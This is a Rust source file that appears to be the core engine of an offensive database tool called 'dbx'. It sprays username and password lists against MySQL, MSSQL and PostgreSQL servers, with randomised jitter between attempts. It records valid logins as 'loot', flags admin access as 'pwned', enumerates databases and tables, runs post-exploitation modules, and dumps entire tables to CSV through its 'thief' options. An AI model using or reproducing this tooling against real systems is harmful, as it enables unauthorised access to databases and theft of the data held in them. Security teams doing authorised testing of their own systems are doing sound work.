use crate::loot::Loot;
use crate::output;
use dbx_core::{
    AuthError, AuthResult, Credential, Dump, ModuleOptions, Opsec, Privilege, Protocol, Session,
    Target,
};
use indicatif::{ProgressBar, ProgressStyle};
use rand::Rng;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;

#[derive(Clone)]
pub struct EngineOpts {
    pub threads: usize,
    pub no_progress: bool,
    pub verify: bool,
    pub timeout: u64,
    pub jitter: Option<(u64, u64)>,
    pub dbs: bool,
    pub tables: bool,
    pub skip_system: bool,
    pub show_failures: bool,
    pub only_pwned: bool,
    pub loot: Option<Loot>,
    pub db: Option<String>,
    pub module: Option<String>,
    pub module_opts: ModuleOptions,
    pub check_only: bool,
    pub force: bool,
    pub thief: Vec<String>,
    pub thief_all: bool,
    pub thief_limit: Option<u64>,
    pub loot_dir: PathBuf,
}

/// Databases that ship with the engine, not with the business.
/// Used by --skip-system in --tables walks and --thief-all.
fn is_system_db(proto: &str, db: &str) -> bool {
    let set: &[&str] = match proto {
        "MYSQL" => &["information_schema", "mysql", "performance_schema", "sys"],
        "MSSQL" => &["master", "model", "msdb", "tempdb"],
        "PGSQL" => &["template0", "template1"],
        _ => &[],
    };
    set.iter().any(|s| s.eq_ignore_ascii_case(db))
}

/// --timeout: hard cap on one auth attempt. Expiry becomes a Network
/// failure so a blackholed host can't stall its target task forever.
async fn with_timeout<F: std::future::Future<Output = AuthResult>>(f: F, secs: u64) -> AuthResult {
    match tokio::time::timeout(Duration::from_secs(secs.max(1)), f).await {
        Ok(r) => r,
        Err(_) => AuthResult::Failed(AuthError::Network(format!(
            "timed out after {secs}s"
        ))),
    }
}

pub async fn run(
    proto: Arc<dyn Protocol>,
    targets: Vec<(String, u16)>,
    creds: Vec<Credential>,
    opts: EngineOpts,
) -> anyhow::Result<()> {
    let n_targets = targets.len();
    let n_auths = n_targets * creds.len();

    let pb = if opts.no_progress {
        ProgressBar::hidden()
    } else {
        let pb = ProgressBar::new(n_targets as u64);
        pb.set_style(
            ProgressStyle::with_template(
                "Running dbx against {msg} targets {wide_bar} {pos}/{len} ({elapsed_precise})",
            )
            .unwrap(),
        );
        pb.set_message(n_targets.to_string());
        pb
    };

    let sem = Arc::new(Semaphore::new(opts.threads.max(1)));
    let valid = Arc::new(AtomicUsize::new(0));
    let pwned = Arc::new(AtomicUsize::new(0));
    let creds = Arc::new(creds);

    let mut handles = Vec::with_capacity(n_targets);
    for (host, port) in targets {
        let permit = sem.clone().acquire_owned().await?;
        let proto = proto.clone();
        let creds = creds.clone();
        let pb = pb.clone();
        let opts = opts.clone();
        let valid = valid.clone();
        let pwned = pwned.clone();

        handles.push(tokio::spawn(async move {
            let target = Target { host: host.clone(), port };

            // --verify: fingerprint before spraying (bogus-auth probe).
            // A target that doesn't answer like this protocol is skipped
            // entirely — no creds burned against a dead/mislabeled port.
            if opts.verify {
                match proto.fingerprint(&target).await {
                    Ok(fp) => {
                        let mut msg = format!("fingerprint: {}", fp.version);
                        if let Some(d) = fp.detail {
                            msg.push_str(&format!(" ({d})"));
                        }
                        pb.suspend(|| output::info(proto.name(), &host, port, &msg));
                    }
                    Err(e) => {
                        if opts.show_failures {
                            let reason = e.to_string();
                            pb.suspend(|| {
                                output::failure(proto.name(), &host, port, "verify", &reason)
                            });
                        }
                        pb.inc(1);
                        drop(permit);
                        return;
                    }
                }
            }

            for (i, cred) in creds.iter().enumerate() {
                // --jitter: random delay between auths against the SAME
                // target. First attempt fires immediately; the semaphore
                // already spaces different targets apart.
                if i > 0 {
                    if let Some((lo, hi)) = opts.jitter {
                        let ms = rand::thread_rng().gen_range(lo..=hi);
                        tokio::time::sleep(Duration::from_millis(ms)).await;
                    }
                }

                let auth = match &opts.db {
                    Some(db) => {
                        with_timeout(proto.authenticate_db(&target, cred, db), opts.timeout).await
                    }
                    None => with_timeout(proto.authenticate(&target, cred), opts.timeout).await,
                };
                match auth {
                    AuthResult::Success(session) => {
                        let priv_ = session.privilege().await.unwrap_or(Privilege::User);
                        let is_pwned = priv_ == Privilege::Admin;
                        valid.fetch_add(1, Ordering::Relaxed);
                        if is_pwned {
                            pwned.fetch_add(1, Ordering::Relaxed);
                        }

                        // loot first — if the terminal dies, the hit survives
                        let cred_id = opts.loot.as_ref().and_then(|loot| {
                            match loot.record_credential(
                                proto.name(), &host, port,
                                &cred.username, &cred.password, is_pwned,
                            ) {
                                Ok(id) => Some(id),
                                Err(e) => {
                                    tracing::warn!("loot write failed: {e}");
                                    None
                                }
                            }
                        });

                        if !opts.only_pwned || is_pwned {
                            let line = format!("{}:{}", cred.username, cred.password);
                            pb.suspend(|| {
                                output::success(proto.name(), &host, port, &line, is_pwned)
                            });
                        }

                        if opts.dbs {
                            if let Ok(mut dbs) = session.enum_databases().await {
                                dbs.sort();
                                for d in dbs {
                                    if opts.skip_system && is_system_db(proto.name(), &d) {
                                        continue;
                                    }
                                    if let (Some(loot), Some(id)) = (&opts.loot, cred_id) {
                                        let _ = loot.record_database(id, &d);
                                    }
                                    pb.suspend(|| {
                                        output::info(proto.name(), &host, port, &format!("db: {d}"))
                                    });
                                }
                            }
                        }

                        list_tables(&*session, &opts, &pb, proto.name(), &host, port).await;
                        run_module(&*session, cred_id, &opts, &pb, proto.name(), &host, port).await;
                        run_thief(&*session, &opts, &pb, proto.name(), &host, port).await;
                    }
                    AuthResult::Failed(e) => {
                        if opts.show_failures {
                            let line = format!("{}:{}", cred.username, cred.password);
                            let reason = e.to_string();
                            pb.suspend(|| {
                                output::failure(proto.name(), &host, port, &line, &reason)
                            });
                        }
                    }
                }
            }
            pb.inc(1);
            drop(permit);
        }));
    }

    for h in handles {
        let _ = h.await;
    }
    pb.finish_and_clear();

    println!(
        "Done. {} auths | {} valid | {} pwned",
        n_auths,
        valid.load(Ordering::Relaxed),
        pwned.load(Ordering::Relaxed)
    );
    Ok(())
}

/// --tables: list what can be thieved before thieving it.
/// With --db, tables of that database via the current session; without,
/// walk every database (same session_for_db hop as --thief-all).
/// --skip-system filters engine-owned databases; empty databases get an
/// explicit notice so silence is never ambiguous.
async fn list_tables(
    session: &dyn Session,
    opts: &EngineOpts,
    pb: &ProgressBar,
    proto: &str,
    host: &str,
    port: u16,
) {
    use colored::Colorize;

    if !opts.tables {
        return;
    }

    let print_empty = |pb: &ProgressBar, db: &str| {
        let msg = format!("{db}: no user tables").dimmed().to_string();
        pb.suspend(|| output::info(proto, host, port, &msg));
    };

    if opts.db.is_some() {
        let db = session.db_name().unwrap_or_else(|| "current".into());
        match session.enum_tables().await {
            Ok(mut tables) => {
                tables.sort();
                if tables.is_empty() {
                    print_empty(pb, &db);
                }
                for t in tables {
                    pb.suspend(|| {
                        output::info(proto, host, port, &format!("table: {db}.{t}"))
                    });
                }
            }
            Err(e) => pb.suspend(|| {
                output::failure(proto, host, port, "tables", &e.to_string())
            }),
        }
        return;
    }

    let dbs = match session.enum_databases().await {
        Ok(mut dbs) => {
            dbs.sort();
            dbs
        }
        Err(e) => {
            pb.suspend(|| {
                output::failure(proto, host, port, "tables", &format!("could not list databases: {e}"))
            });
            return;
        }
    };
    for db in dbs {
        if opts.skip_system && is_system_db(proto, &db) {
            continue;
        }
        match session.session_for_db(&db).await {
            Ok(s2) => match s2.enum_tables().await {
                Ok(mut tables) => {
                    tables.sort();
                    if tables.is_empty() {
                        print_empty(pb, &db);
                    }
                    for t in tables {
                        pb.suspend(|| {
                            output::info(proto, host, port, &format!("table: {db}.{t}"))
                        });
                    }
                }
                Err(e) => pb.suspend(|| {
                    output::failure(proto, host, port, &format!("tables {db}"), &e.to_string())
                }),
            },
            Err(e) => pb.suspend(|| {
                output::failure(proto, host, port, &format!("tables {db}"), &e.to_string())
            }),
        }
    }
}

/// -M: check first (always), run only if verified possible.
/// Red opsec modules need --force.
async fn run_module(
    session: &dyn Session,
    cred_id: Option<i64>,
    opts: &EngineOpts,
    pb: &ProgressBar,
    proto: &str,
    host: &str,
    port: u16,
) {
    let Some(name) = &opts.module else { return };
    let m = match session.module(name) {
        Ok(m) => m,
        Err(e) => {
            pb.suspend(|| output::failure(proto, host, port, name, &e.to_string()));
            return;
        }
    };
    let meta = m.meta();

    if meta.opsec == Opsec::Red && !opts.force {
        pb.suspend(|| {
            output::module(proto, host, port, name, "RED opsec module — leaves artifacts; re-run with --force to execute")
        });
        return;
    }

    match m.check().await {
        Err(e) => pb.suspend(|| output::failure(proto, host, port, name, &e.to_string())),
        Ok(chk) => {
            let verdict = if chk.possible { "POSSIBLE" } else { "not possible" };
            pb.suspend(|| {
                output::module(proto, host, port, name, &format!("check {verdict}: {}", chk.detail))
            });
            if !chk.possible {
                return;
            }
            if let (Some(loot), Some(id)) = (&opts.loot, cred_id) {
                let _ = loot.record_verified_primitive(id, name, &chk.detail);
            }
            if opts.check_only {
                return;
            }
            match m.run(&opts.module_opts).await {
                Ok(res) => {
                    for line in &res.lines {
                        pb.suspend(|| output::module(proto, host, port, name, line));
                    }
                    if let (Some(loot), Some(id)) = (&opts.loot, cred_id) {
                        let opts_str = opts
                            .module_opts
                            .iter()
                            .map(|(k, v)| format!("{k}={v}"))
                            .collect::<Vec<_>>()
                            .join(",");
                        let _ = loot.record_module_run(id, name, &opts_str, &res.lines.join("\n"));
                    }
                }
                Err(e) => pb.suspend(|| output::failure(proto, host, port, name, &e.to_string())),
            }
        }
    }
}

/// --thief / --thief-all: dump tables to CSV on the operator's machine.
/// --thief-all respects --skip-system.
async fn run_thief(
    session: &dyn Session,
    opts: &EngineOpts,
    pb: &ProgressBar,
    proto: &str,
    host: &str,
    port: u16,
) {
    if !opts.thief_all && opts.thief.is_empty() {
        return;
    }
    let base = opts
        .loot_dir
        .join("thief")
        .join(format!("{proto}_{host}_{port}"));

    if opts.thief_all {
        let Ok(dbs) = session.enum_databases().await else {
            pb.suspend(|| output::failure(proto, host, port, "thief", "could not list databases"));
            return;
        };
        for db in dbs {
            if opts.skip_system && is_system_db(proto, &db) {
                continue;
            }
            match session.session_for_db(&db).await {
                Ok(s2) => match s2.enum_tables().await {
                    Ok(tables) => {
                        for t in tables {
                            dump_one(&*s2, &db, &t, &base, opts.thief_limit, pb, proto, host, port).await;
                        }
                    }
                    Err(e) => pb.suspend(|| {
                        output::failure(proto, host, port, &format!("thief {db}"), &e.to_string())
                    }),
                },
                Err(e) => pb.suspend(|| {
                    output::failure(proto, host, port, &format!("thief {db}"), &e.to_string())
                }),
            }
        }
    } else {
        let db = session.db_name().unwrap_or_else(|| "current".into());
        for t in &opts.thief {
            dump_one(session, &db, t, &base, opts.thief_limit, pb, proto, host, port).await;
        }
    }
}

async fn dump_one(
    session: &dyn Session,
    db: &str,
    table: &str,
    base: &Path,
    limit: Option<u64>,
    pb: &ProgressBar,
    proto: &str,
    host: &str,
    port: u16,
) {
    match session.dump_table(table, limit).await {
        Ok(dump) => {
            let safe = table.replace(['/', '\\', '.'], "_");
            let dir = base.join(db);
            let path = dir.join(format!("{safe}.csv"));
            match write_csv(&dir, &path, &dump) {
                Ok(n) => pb.suspend(|| {
                    output::module(proto, host, port, "thief", &format!("{db}.{table}: {n} rows -> {}", path.display()))
                }),
                Err(e) => pb.suspend(|| {
                    output::failure(proto, host, port, "thief", &format!("{db}.{table}: {e}"))
                }),
            }
        }
        Err(e) => pb.suspend(|| {
            output::failure(proto, host, port, "thief", &format!("{db}.{table}: {e}"))
        }),
    }
}

fn write_csv(dir: &Path, path: &Path, dump: &Dump) -> std::io::Result<usize> {
    std::fs::create_dir_all(dir)?;
    let mut s = String::new();
    s.push_str(
        &dump.columns.iter().map(|c| csv_field(c)).collect::<Vec<_>>().join(","),
    );
    s.push('\n');
    for row in &dump.rows {
        s.push_str(
            &row.iter().map(|c| csv_field(c)).collect::<Vec<_>>().join(","),
        );
        s.push('\n');
    }
    std::fs::write(path, s)?;
    Ok(dump.rows.len())
}

fn csv_field(f: &str) -> String {
    if f.contains([',', '"', '\n']) {
        format!("\"{}\"", f.replace('"', "\"\""))
    } else {
        f.to_string()
    }
}
